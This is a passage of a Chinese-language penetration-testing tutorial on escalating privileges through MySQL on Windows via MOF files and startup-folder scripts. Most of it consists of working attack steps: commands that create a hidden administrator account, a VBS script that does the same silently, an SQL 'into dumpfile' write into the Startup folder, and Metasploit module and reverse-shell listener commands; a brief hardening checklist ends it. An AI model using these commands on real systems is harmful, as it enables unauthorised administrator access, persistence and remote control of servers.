![4](https://image.3001.net/images/20220620/1655716982_62b03c7612362232e665d.png!small)

写入执行命令，点击 exploit 成功添加用户

    
    
    net user mac xxx12456 /add && net localgroup administrators mac /add
    

![5](https://image.3001.net/images/20220620/1655716982_62b03c76ec24ee787645c.png!small)

在计算机管理中发现用户添加成功  
![6](https://image.3001.net/images/20220620/1655716984_62b03c78475b9762be596.png!small)

当然在 MSF 中也集成了 MOF 提权模块，使用起来相对来说比较方便且能够自动清理痕迹

    
    
    msf > use exploit/windows/mysql/mysql_mof
    msf > set payload windows/meterpreter/reverse_tcp
    msf > set rhosts 10.10.10.10
    msf > set username root
    msf > set password root
    msf > run
    

### 启动项提权

在 Windows 环境下我们还可以利用 MySQL 数据库的文件写入将自定义脚本导入启动项当中，利用脚本可在系统用户登录、开机、关机时自动运行。

#### 手动提权

Windows 中常见的启动项路径如下：

    
    
    # Windows Server 2003中文系统
    C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
    C:\Documents and Settings\All Users\「开始」菜单\程序\启动
    
    # Windows Server 2003英文系统
    C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
    C:\Documents and Settings\All Users\Start Menu\Programs\Startup
    
    # Windows Server 2003开关机项 需要自己建立对应文件夹
    C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
    C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown
    
    # Windows Server 2008
    C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    

启动项路径支持脚本类型为 vbs 和 exe，无论是利用 vbs 执行 cmd 命令还是通过 CS 生成 exe 都能完成利用，以下为添加管理员的 VB
脚本

    
    
    Set WshShell=WScript.CreateObject("WScript.Shell")
    WshShell.Run "net user mac P@ssw0rd /add", 0
    WshShell.Run "net localgroup administrators mac /add", 0
    

接下来将 VB 脚本经过 hex 编码后通过 SQL 语句写入系统启动项当中

    
    
    select 0x1234... into dumpfile "C:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup\\test.vbs"
    

成功写入等待用户重新登录，登录成功的同时脚本也会自动执行。

#### MSF提权

在 MSF 中也集成了相关的利用模块，使用起来非常方便

    
    
    msf > use exploit/windows/mysql/mysql_start_up
    msf > set rhosts 10.10.10.10
    msf > set username root
    msf > set password root
    msf > run
    

![截屏2022-06-17
03.48.52](https://image.3001.net/images/20220620/1655716985_62b03c7929a62871138bd.png!small)

在本地开启 MSF 监听并注销用户

    
    
    msf6 > handler -H 192.168.0.111 -P 4444 -p windows/meterpreter/reverse_tcp
    

重新登录后上线 MSF  
![截屏2022-06-17
03.54.37](https://image.3001.net/images/20220620/1655716986_62b03c7a3b7872e9d6d40.png!small)

## 0x05 MySQL安全防护

    
    
    1、禁用弱口令、匿名登录
    2、采用最小权限原则，数据库连接非必要不使用管理员用户
    3、如无需要禁止用户开启外联
    4、限制多次登录及失败重试时间
    5、开启日志记录
    

**参考文章1：https://www.sqlsec.com/2020/11/mysql.html**

 **参考文章2：https://github.com/safe6Sec/PentestDB/**

